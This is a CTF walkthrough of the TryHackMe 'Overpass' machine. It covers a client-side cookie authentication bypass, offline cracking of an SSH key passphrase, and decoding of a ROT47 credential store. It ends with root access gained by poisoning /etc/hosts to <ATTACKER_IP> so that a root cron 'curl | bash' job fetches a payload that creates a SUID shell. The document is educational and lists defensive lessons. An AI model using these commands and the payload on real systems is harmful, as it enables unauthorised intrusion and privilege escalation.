# CTF Writeup — Overpass

## 📌 Overview

* **Platform:** TryHackMe
* **Difficulty:** Easy
* **Objective:** Full compromise — User flag + Root flag

Overpass is a beginner-friendly Linux machine themed around a fictional open-source password manager built by CompSci students. The attack path chains three distinct vulnerabilities: a client-side authentication bypass on the admin panel, an encrypted SSH private key recovered from the web application and cracked offline, and a privilege escalation via a cron job that fetches and executes a remote shell script — exploitable through `/etc/hosts` manipulation.

---

## 🔍 Enumeration

### 1. Initial Reconnaissance

Port discovery was performed using RustScan with aggressive service detection to quickly identify the target's exposed attack surface.

```bash
rustscan -a 10.64.147.112 -- -A
```

**Results:**

| Port | Service |
|------|---------|
| 22   | SSH (OpenSSH) |
| 80   | HTTP (web server) |

With only two open ports, the HTTP service was the natural first target. SSH would likely become relevant once credentials or key material were obtained.

---

### 2. Further Enumeration

#### Web Application Review

Browsing to `http://10.64.147.112` revealed the Overpass password manager landing page. An HTML comment in the page source provided the first useful indicator:

```html
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
```

This suggested the application's encryption might be Caesar-based or a trivial rotation cipher — a detail filed away for later analysis.

The application's downloadable Go source file was retrieved from `/downloads` for static analysis.

#### Directory Fuzzing

```bash
ffuf -u "http://10.64.147.112/FUZZ" -w /usr/share/dirb/wordlists/common.txt
```

**Discovered paths:**

```
aboutus   [301]
admin     [301]
css       [301]
downloads [301]
img       [301]
```

The `/admin` endpoint was identified as high priority.

#### Source Code Analysis — `overpass.go`

Reviewing the downloaded Go source revealed that the application encrypts stored credentials using **ROT47**, a rotation cipher operating on ASCII characters 33–126:

```go
func rot47(input string) string {
    var result []string
    for i := range input[:len(input)] {
        j := int(input[i])
        if (j >= 33) && (j <= 126) {
            result = append(result, string(rune(33+((j+14)%94))))
        } else {
            result = append(result, string(input[i]))
        }
    }
    return strings.Join(result, "")
}
```

Credentials are stored encrypted in `~/.overpass` in the user's home directory. This confirmed that if the file was accessible on the server, it could be trivially decrypted.

#### Admin Panel Analysis

The `/admin` page presented a login form. Inspecting the referenced JavaScript files revealed the authentication logic in `login.js`:

```javascript
async function login() {
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        window.location = "/admin"
    }
}
```

The critical flaw: authentication is enforced entirely client-side. The server returns a session token on success, and the JavaScript sets a `SessionToken` cookie before redirecting to `/admin`. No server-side session validation was in place — the presence of the cookie alone granted access.

---

## 💥 Exploitation

### Vulnerability 1 — Client-Side Authentication Bypass

* **Type:** Authentication bypass (client-side logic flaw)
* **Location:** `/admin` — `login.js`
* **Impact:** Full access to the administrator panel without valid credentials

Since the `/admin` route only checked for the existence of the `SessionToken` cookie, access was obtained by manually creating the cookie in the browser without submitting any credentials.

**Steps:**

1. Opened Firefox Developer Tools → **Storage** → **Cookies**
2. Created a new cookie with the name `SessionToken` and any non-empty value
3. Refreshed the page

Access to the admin panel was granted immediately, revealing the following message and an encrypted RSA private key:

```
Since you keep forgetting your password, James, I've set up SSH keys for you.
If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox
```

The full passphrase-protected RSA private key was extracted from the page.

---

### Vulnerability 2 — Offline RSA Key Cracking → SSH Access

The recovered RSA private key was passphrase-protected. The passphrase was cracked offline using `john`.

```bash
# Save the key
nano id_rsa   # paste the full PEM block
chmod 600 id_rsa

# Convert to a crackable hash
ssh2john id_rsa > hash.txt

# Crack against rockyou
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result:**

```
j******          (id_rsa)
```

SSH access was established as user `james`:

```bash
ssh -i id_rsa james@10.64.147.112
```

**User flag retrieved:**

```bash
james@ip-10-64-147-112:~$ cat user.txt
thm{---}
```

#### Credential Recovery from `.overpass`

The encrypted credential store was found in `james`'s home directory:

```bash
james@ip-10-64-147-112:~$ cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

Decoding this with ROT47 (consistent with the application's encryption scheme) yielded:

```json
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

The recovered password did not grant `sudo` privileges:

```bash
sudo -l
# Password accepted, but: Sorry, user james may not run sudo on ip-10-64-147-112.
```

---

## 🔓 Privilege Escalation

### Local Enumeration

#### SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

No non-standard SUID binaries were identified. All results corresponded to expected system binaries.

#### Cron Jobs

```bash
cat /etc/crontab
```

A privileged cron job was identified executing every minute:

```
* * * * *   root   curl overpass.thm/downloads/src/buildscript.sh | bash
```

This job fetches a remote shell script over HTTP and pipes it directly into `bash` as `root` — a critical misconfiguration. The hostname `overpass.thm` is resolved via `/etc/hosts`, which was world-writable.

### Identified Vector — Cron Job Hijacking via `/etc/hosts` Poisoning

* **Type:** Cron job hijacking + DNS/hosts file manipulation
* **Impact:** Remote code execution as `root`

Since `james` had write access to `/etc/hosts`, the hostname `overpass.thm` could be redirected to the attacker's machine. A malicious `buildscript.sh` served at the expected path would then be fetched and executed as `root` on the next cron cycle.

### Exploitation Steps

**1. Modify `/etc/hosts` on the target to point `overpass.thm` to the attacker's IP:**

```bash
# Fix terminal if needed
export TERM=xterm

nano /etc/hosts
# Add:
<ATTACKER_IP>  overpass.thm
```

**2. On the attacker machine, prepare the malicious build script:**

```bash
mkdir -p downloads/src

cat > downloads/src/buildscript.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
```

**3. Serve the payload over HTTP on port 80:**

```bash
python3 -m http.server 80
```

The cron job fetched the script within one minute:

```
10.65.131.74 - - [30/Apr/2026 12:56:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

**4. Execute the SUID bash binary to obtain a root shell:**

```bash
james@ip-10-65-131-74:~$ /tmp/rootbash -p
rootbash-5.0# whoami
root
```

**Root flag retrieved:**

```bash
rootbash-5.0# cat /root/root.txt
thm{---}
```

---

## Attack Flow

```mermaid
flowchart TD
    A[Start Recon on THM target] --> B[Run RustScan]
    B --> B1[Open ports 22 SSH and 80 HTTP]
    B1 --> C[Web enumeration and page review]
    C --> C1[Find admin endpoint and overpass.go source]
    C1 --> D[Analyze login.js]
    D --> D1[Client side auth relies on SessionToken cookie]
    D1 --> E[Bypass by creating SessionToken manually]
    E --> E1[Gain access to admin panel]
    E1 --> F[Extract encrypted RSA private key]

    F --> G[Crack passphrase offline]
    G --> G1[Use ssh2john and john with rockyou]
    G1 --> H[SSH access as user james]
    H --> H1[Read user flag]

    H1 --> I[Perform local enumeration]
    I --> I1[Read .overpass and decode ROT47]
    I1 --> I2[Recover credentials]
    I2 --> J[Test sudo access no privileges]

    J --> K[Inspect cron jobs]
    K --> K1[Root cron runs curl overpass.thm/downloads/src/buildscript.sh pipe bash]
    K1 --> L[Identify hijack path via hosts file]
    L --> L1[Edit /etc/hosts to point overpass.thm to attacker]

    L1 --> M[Host malicious buildscript on attacker machine]
    M --> M1[Root cron fetches and executes payload]
    M1 --> N[Payload creates SUID bash in tmp]
    N --> O[Run /tmp/rootbash -p]
    O --> O1[Obtain root shell]
    O1 --> P[Read root flag]
```



## 🧠 Lessons Learned

- **Client-side authentication is not authentication.** When authorization logic lives entirely in JavaScript, any user can bypass it by manipulating browser state. Always enforce authentication server-side; the client cannot be trusted.

- **Symmetric, non-keyed ciphers provide no meaningful security.** ROT47 is a substitution cipher with zero secret — reversing it requires no key material whatsoever. Credential storage must use proper authenticated encryption (e.g., AES-GCM) or a dedicated secrets management solution.

- **Cron jobs that fetch and execute remote scripts are a severe risk.** The pattern `curl <url> | bash` as `root` effectively grants whoever controls DNS resolution over that hostname a root shell. This class of misconfiguration is common in automated build pipelines and should never run as a privileged user without cryptographic verification of the script.

- **World-writable system files are a privilege escalation vector.** A writable `/etc/hosts` enabled full DNS poisoning without any exploit. Verify file permissions on critical configuration files during hardening reviews.

- **SSH key passphrases must be strong.** The passphrase was cracked trivially against `rockyou.txt`. Key passphrases should meet the same entropy requirements as any privileged credential.

---

## 🧩 Tools Used

* **RustScan** — fast port discovery
* **ffuf** — web directory fuzzing
* **Firefox DevTools** — JavaScript analysis and cookie manipulation
* **ssh2john / John the Ripper** — RSA private key passphrase cracking
* **Python3 http.server** — payload delivery
* **ROT47 decoder** — credential recovery from `.overpass`

---

## ⚠️ Notes

* Flags are intentionally omitted from the methodology sections above
* This writeup focuses on methodology and learning
* All activity was performed in an isolated TryHackMe lab environment
